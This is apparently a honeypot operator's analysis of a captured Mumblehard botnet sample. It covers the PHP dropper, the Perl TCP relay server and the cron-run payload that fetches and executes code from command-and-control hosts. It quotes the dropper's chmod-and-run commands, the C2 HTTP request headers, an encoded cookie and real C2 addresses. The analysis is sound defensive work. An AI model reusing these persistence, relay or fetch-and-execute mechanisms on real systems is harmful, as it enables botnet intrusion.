# chat.pl - mumblehard bot

Code for Mumblehard botnet.

This bot has two parts:

1. A constantly executing TCP/IP server that ends up
as a byte-stream relay.
2. A program executed every 10 minutes by cron that
can download Perl code from a command and control server,
and start it executing.

It looks like whoever runs the command and control server
has control over what other IP address can use
mumblehard servers as relay.
Permission by IP address can be given or revoked.
Looks like the bot herder has a business model
of selling access to relays.

#### Mumblehard references:

* https://www.welivesecurity.com/wp-content/uploads/2015/04/mumblehard.pdf
* http://hardwarefetish.com/681-mumblehard-c-trojan-unpacked
* https://detux.org/report.php?sha256=a4199f2a1539f0e9b5d18b81873ad65f332046b2a1c4f7e44b039fd93e369c87

The particular download I'm looking at here does not
use an ELF file as a dropper.
My honey pot has captured [two other downloads](../mumblehard)
that do use an ELF file as a dropper.
Looks like mumblehard has evolved a little in the last 3 years.

## Origin

### IP Address

Right now, 87.106.242.16 is in 87.106.0.0/16AS8560. That looks like
a 1&1 German subsidiary, in Karlsruhe, Germany.

DNS says 87.106.242.16 is s15316012.onlinehome-server.info

`whois onlinehome-server.info` gives 1&1 Internet Inc. as admin, registrant and billing contacts.

### Download

Downloaded to a honey pot WSO web shell. The downloader wanted to
execute the "Php" action that WSO provides,
which is immediate eval of PHP code,
with no file created.
The code downloaded does create a file
in which to store the Perl payload,
but it deletes that file as soon as it can.

## Decoding

1. Hand edit `87.106.242.16WjPLrzyjMixMC240GgLqBAAAAAo.php.file` into `dc1.php` to decode the Base64-encoded block of text.
2. Execute `php dc1.php > chat.pl`

Downloaded a PHP program to a PHP program,
that creates a Perl program, which drops another Perl program.

## Analysis

There's at least 3 things to be analyzed:

1. PHP dropper
2. Perl server (`chat.pl`)
3. Perl persistent payload

### PHP dropper

The dropper program, the PHP program fed to WSO's "Php" action,
contains a hard-coded URL for my honey pot.
The attacker must recode everything for every compromised WordPress site.

The PHP dropper code goes to enormous effort to get `chat.pl` executing.
It composes two commands:

    $i1="chmod +x $t && /usr/bin/perl $t";
    $i2="chmod +x $t && perl $t";

Then tries to execute these commands using PHP built-ins
`system()`, `exec()`, `passthru()`, `shell_exec()`, `popen()` and `proc_open()`,
stopping on the first success. `$t` holds the fully qualified path to `chat.pl`.
I expect that the `$i2` command is to execute the `chat.pl` intermediate
on Windows - `/usr/bin` is almost certainly in any Linux PATH.

### Server

#### Summary

As near as I can tell, the server listens on TCP
port 33778, and makes a TCP connection to 77.72.83.83:37827.
If an IP address connects to 33778, and it's on the
"allowed hosts" list, the server opens a second socket
and relays bytes from 33778 to that second socket.
Initially only 77.72.83.83 can do this, but a command exists
to add more IP address to the "allowed hosts" list.

The server is just a TCP/IP relay for a list of IP addresses,
with a provision for adding more addresses to the list.

#### Details

It looks like the server can work under Linux, FreeBSD and "MSWin32".
The Linux and FreeBSD specific code seems appropriate.
I can't speak to the quality of the Windows-specific code.

The `chat.pl` program seems like a decently written Perl
server. It does smart server things like change directory to
"/", the root of the filesystem,
it ignores signals like HUP, INT, QUIT, etc,
that Linux/Unix server processes should ignore.
and re-opens STDIN, STDOUT and STDERR as /dev/null.
It forks and sets a session ID, to detach itself from any TTY.

The code is of uniform style and quality. It does `use strict;`
which is wise for Perl programs.
Variables and functions are consistently named in all lower-case.
Functions are called old school style, i.e. `&startserver();`,
with a leading ampersand.

Whoever wrote it was something of a Perl master:
they used `sysread()`, `syswrite()`, raw system calls on sockets.
The author used `pack()` to create,
and then `unpack()` to read, binary-formatted DNS packets.
The author used the little-known `||=` operator.

It does a complicated, interwoven test on
11 IP addresses,
3 TCP protocols (SMTP, DNS, HTTP)
and one UDP protocol (DNS).

|IP Address|DNS Name|Port|Protocol|
|----------|--------|----|--------|
|216.146.43.70|checkip.dyndns.com|TCP/80|HTTP|
|77.88.55.60|yandex.ru|TCP/80|HTTP|
|65.55.92.184|mx1.hotmail.com|TCP/25|SMTP|
|152.163.0.100|mailin-05.mail.aol.com|TCP/25|SMTP|
|98.138.112.38|Yahoo owns it|TCP/25|SMTP|
|205.188.157.232|dns-01.ns.aol.com|TCP/53|DNS|
|205.188.157.232|dns-02.ns.aol.com|TCP/53|DNS|
|205.188.157.232|dns-01.ns.aol.com|UDP/53|DNS|
|205.188.157.232|dns-02.ns.aol.com|UDP/53|DNS|

`chat.pl` tests for whether it can connect to various
useful services that are almost certainly always up.

If `chat.pl` can't connect to at least one of the SMTP
servers, it exits.

If `chat.pl` can't connect to at least one of the DNS
servers, it sets a variable that will cause it to use
it's own, native Perl, DNS library.

Under Linux or "BSD" `chat.pl` leaves behind another file,
then sets `cron` to execute that file: `*/10 * * * * `
This means execute the payload every 10 minutes.

`chat.pl` creates two randomly named files in  `/var/tmp`
or `/tmp`, something like:

    /var/tmp/XPVPxdRrg
    /var/tmp/XPVPxdRrg1

The first file name will end up containing obfuscated code
for a persistent payload.
The second file name will contain the crontab entry,
and gets unlinked after `crontab` updates with the entry above.

After writing out the persistent payload
and doing all the connectivity testing,
`chat.pl` becomes a Linux or FreeBSD daemon process,
provided it's not running on Windows.

`sub main()` and `sub startserver()` both do "become a daemon" actions.
Seems like a mistake on the author's part,
given that `startserver()` executes after `main()`,
in a process that's already daemonized.

The server code starts to listen for connections
on TCP port 33778 and
connects to 77.72.83.83, TCP port 37827.
After that, a state machine takes over,
waiting for "connect" to IP addresses to return,
or sockets to become readable.
This code multiplexes reading and writing sockets,
and other duties, on a single Perl flow-of-control.

The state machine handles sockets becoming readable,
the code makes a distinction in what it does between
the "listen port", (TCP port 33778),
and all other IP addresses.

If the "listen port" makes a connection,
and the other side is in the "allow host" list
(initially only 77.72.83.83),
the server sets up a second socket.
It connects the listen port connection and the second socket via "handle" and "target"
elements of the "session" (socket and metadata) hash.
Later, the state machine will relay bytes between the two
sockets.

If the connecting IP address is not in the "allow hosts" list,
the state machine closes the socket, and moves on.

If any connected socket (which started out in the "alllow hosts" list)
sends a command, something special happens. There are 2 commands:

* Command "\x70\x10" - destroy the "target" session.
* Command "\x04\x01" - appears to do nothing but set session (socket + metadata) status to "rd_cl".

The next time a socket becomes readable, the "rd_cl" status
will cause the state machine to read a 4-byte IP address and 2-byte port number from the socket,
and connect the socket to that IP address.

#### Decoding the Persistent Payloads

1. Hand-edit `chat.pl`, yielding files `BDRPDATABSD` and `BDRPDATALIN`.
2. Hand edit the "BDRP*" files to use the decoding method from `chat.pl`
3. Invoke: `perl BDRPDATABSD > BDRPDATABSD.out`
4. Invoke: `perl BDRPDATALIN > BDRPDATALIN.out`
5. Invoke: `perl BDRPDATABSD.out > BDRPDATABSD.out.out`
6. Invoke: `perl BDRPDATALIN.out > BDRPDATALIN.out.out`
7. Use `perltidy` on `BDRPDATALIN.out.out` and `BDRPDATABSD.out.out` to increase readability.

Files `BDRPDATABSD.out` and `BDRPDATALIN.out` are more Perl code
obfuscated with the same method
as `BDRPDATABSD` and `BDRPDATALIN`, necessitating a second decoding.
The Perl uses `unpack('u*',$', $string)` to do uudecoding,
which is fairly sophisticated.  UUencoded source is pretty old school.

`BDRPDATABSD.out.out.tdy` and `BDRPDATALIN.out.out.tdy` are identical. How bout that?

#### Analysis of Persistent Payload

The persistent payload looks like it has the same author as `chat.pl`,
the code is consistently formatted, variables name in "snake_case",
and the Perl `code if $condition;` construct appears a lot.
The peristent payload also becomes a well-mannered Linux or *BSD
daemon, changing directory to "/", 
forking and setting session ID to detach from any TTY,
ignoring certain signals,
and changing stdin, stdout and stderr to /dev/null.
It's probably overkill for something started by `cron`.

It appears that the payload tries IP addresses 5.135.42.98 and 77.72.83.83,
connecting to TCP port 80 on each.

It would do an HTTP request with these headers:

    GET / HTTP/1.1
    Host: stratigery.com
    User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/$N Firefox/7.0.1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.8,*/*;q=0.9
    Accept-Language: en-us,en;q=0.5
    Accept-Encoding: gzip, deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Connection: close

The "Gecko/$N" is of interest.
The code sets $N to "0" or "1" for different HTTP requests.
The first request has a "Gecko/0" in the user agent string,
This apparently causes mumblehard Command and Control
to send back HTTP response headers with a cookie
named "PHPSESSID". For example:

    Set-Cookie: PHPSESSID=300518103c7675742a676972646d6365226e612076722e676a68736d677e2478656b6275623d757870757e79366e7e716d306f6f6575696f6d67; path=/

It appears to decode the cookie if it gets a "200 OK" HTTP response code
from both IP addresses.

[Decoding that cookie](decode_cookie.pl) fills in 4 Perl variables:

|$link|www.bouldin.co/wp-content/themes/flecia/temp.|
|$file|""|
|$id|24|
|$command|16|
|$timeout|60|

Right now, `www.bouldin.co` is 104.28.24.112 and 2400:cb00:2048:1::681c:1870,
both Cloudflare.com IP addresses.

The `$command` value of "16" causes the persisent payload
to try a second HTTP request, this time from the
value of `$link`, apparently to download `$file`.
It sets $N in the user agent string to "1" for this request.

Should the download go well, it runs a Perl `system` command
to get the downloaded file to run.
The persistent payload does another HTTP request of
each of the two IP addresses it started with,
sending back the value of `$id`, the HTTP response code
it got from `$link`, and how many bytes it downloaded.

Ultimately, the persistent payload does nothing other
than download some code (apparently Perl) and execute it.
The work of the botnet must be done in  that code.

Since this code executes every 10 minutes, the server code in `/var/tmp/`
will get recovered rapidly if someone deletes it.
